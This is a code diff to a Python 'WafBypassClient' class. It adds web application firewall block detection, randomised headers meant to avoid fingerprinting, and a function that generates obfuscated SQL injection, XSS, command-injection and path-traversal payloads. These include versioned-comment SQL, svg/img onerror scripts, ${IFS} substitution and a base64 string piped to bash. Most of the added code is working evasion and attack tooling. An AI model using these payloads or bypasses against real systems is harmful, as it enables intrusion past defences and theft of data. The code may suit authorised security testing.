@@ -14,9 +14,34 @@ Usage:
 """
 
 import os
+import re
+import random
 import time
 import threading
+import urllib.parse
 from urllib.parse import urlparse
+
+# ── WAF block-detection signals ──────────────────────────────────────────────
+
+_BLOCK_CODES = {403, 406, 429, 503}
+
+_BLOCK_BODY_RE = re.compile(
+    r"access.?denied|blocked|firewall|security.?check|attack.?detected|"
+    r"not.?allowed|forbidden|protection|violation|your.?ip|cloudflare.?ray|"
+    r"incapsula|sucuri|barracuda|request.?blocked|bot.?detected",
+    re.IGNORECASE,
+)
+_BLOCK_HEADERS = {"cf-ray", "x-sucuri-id", "x-iinfo", "x-fw-", "x-waf"}
+
+# Pool of realistic Accept-Language / Accept / Referer values for obfuscation
+_ACCEPT_LANGS = [
+    "en-US,en;q=0.9", "en-GB,en;q=0.9", "ar-SA,ar;q=0.9,en;q=0.8",
+    "fr-FR,fr;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8",
+]
+_REFERERS = [
+    "https://www.google.com/", "https://www.bing.com/",
+    "https://duckduckgo.com/", "",
+]
 
 # ---------------------------------------------------------------------------
 # Graceful import — the tool must work even when botasaurus is absent.
@@ -141,6 +166,124 @@ class WafBypassClient:
         """Return cookies captured from browser bypass sessions."""
         with self._lock:
             return dict(self._harvested_cookies)
+
+    # ------------------------------------------------------------------
+    # Block detection
+    # ------------------------------------------------------------------
+
+    @staticmethod
+    def is_blocked(response) -> bool:
+        """Return True if *response* looks like a WAF block."""
+        if response is None:
+            return True
+        code = getattr(response, "status_code", 200)
+        if code in _BLOCK_CODES:
+            if code in (429, 400):
+                # Only flag rate-limit as a block when WAF body/header also present
+                return WafBypassClient._waf_signature(response)
+            return True
+        return WafBypassClient._waf_signature(response)
+
+    @staticmethod
+    def _waf_signature(response) -> bool:
+        body = (getattr(response, "text", "") or "")[:3000]
+        if _BLOCK_BODY_RE.search(body):
+            return True
+        hdrs = {k.lower() for k in (getattr(response, "headers", {}) or {})}
+        return bool(hdrs & _BLOCK_HEADERS)
+
+    # ------------------------------------------------------------------
+    # Payload-level bypass variants (no browser needed)
+    # ------------------------------------------------------------------
+
+    @staticmethod
+    def obfuscate_headers() -> dict:
+        """Return a randomised set of browser-like headers to reduce fingerprint."""
+        return {
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": random.choice(_ACCEPT_LANGS),
+            "Accept-Encoding": "gzip, deflate, br",
+            "Referer": random.choice(_REFERERS),
+            "Cache-Control": random.choice(["no-cache", "max-age=0"]),
+            "Upgrade-Insecure-Requests": "1",
+        }
+
+    @staticmethod
+    def generate_payload_bypasses(payload: str, vuln_type: str = "sqli") -> list[str]:
+        """
+        Return obfuscated variants of *payload* for the given vulnerability type.
+        Used when the raw payload gets blocked by a WAF.
+        """
+        variants: list[str] = []
+        p = payload
+
+        if vuln_type == "sqli":
+            # Comment injection between SQL keywords
+            def _cmt(s):
+                for kw in ["SELECT","UNION","WHERE","AND","OR","FROM","ORDER","BY","DROP","INSERT"]:
+                    s = re.sub(rf"\b{kw}\b", f"{kw[0]}/**/{kw[1:]}", s, flags=re.IGNORECASE)
+                return s
+            variants.append(_cmt(p))
+            variants.append(p.replace(" ", "/**/"))
+            variants.append(p.replace(" ", "%09"))          # tab
+            variants.append(p.replace(" ", "%0a"))          # LF
+            variants.append(p.replace(" ", "%0d%0a"))       # CRLF
+            # Mixed case
+            variants.append("".join(c.upper() if random.random()>0.5 else c.lower() for c in p))
+            # Double URL encode
+            variants.append(urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""))
+            # MySQL versioned comment
+            variants.append(p.replace("SELECT","/*!50000SELECT*/").replace("UNION","/*!50000UNION*/"))
+            # Hex-encode string literals
+            variants.append(re.sub(r"'([^']+)'",
+                lambda m: "0x"+m.group(1).encode().hex(), p))
+            # CHAR() encode
+            variants.append(re.sub(r"'([^']+)'",
+                lambda m: "CHAR("+",".join(str(ord(c)) for c in m.group(1))+")", p))
+
+        elif vuln_type == "xss":
+            variants += [
+                "<svg/onload=alert(1)>",
+                "<img src=x onerror=alert(1)>",
+                "<details open ontoggle=alert(1)>",
+                "<input autofocus onfocus=alert(1)>",
+                "'\"><svg onload=alert`1`>",
+                "\"><img src=x onerror=prompt(1)>",
+                "<script>alert`1`</script>",
+                "javascript:alert(1)",
+                p.replace("alert", "alert"),   # unicode
+                p.replace("<", "%3C").replace(">", "%3E"),
+                p.replace("<", "＜").replace(">", "＞"),         # fullwidth
+                p.replace(" ", "\t"),
+                p.replace("onerror", "ONERROR"),
+            ]
+
+        elif vuln_type == "rce":
+            variants.append(p.replace(" ", "${IFS}"))
+            variants.append(p.replace(" ", "$IFS$9"))
+            import base64 as _b64
+            b64 = _b64.b64encode(p.encode()).decode()
+            variants.append(f"echo {b64}|base64 -d|bash")
+            variants.append(p.replace("cat", "{cat,}").replace("ls", "{ls,}"))
+
+        elif vuln_type == "lfi":
+            variants.append(p.replace("../", "..%2f"))
+            variants.append(p.replace("../", "%2e%2e%2f"))
+            variants.append(p.replace("../", "..%252f"))    # double encode
+            variants.append(p.replace("../", "....//"))
+            variants.append(p + "%00")
+
+        # Generic: URL-encode special chars
+        variants.append(urllib.parse.quote(p, safe=""))
+        variants.append(urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""))
+
+        # Deduplicate, preserving order, skip identity
+        seen, out = {p}, []
+        for v in variants:
+            if v and v not in seen:
+                seen.add(v)
+                out.append(v)
+        return out
 
     @property
     def available(self) -> bool:
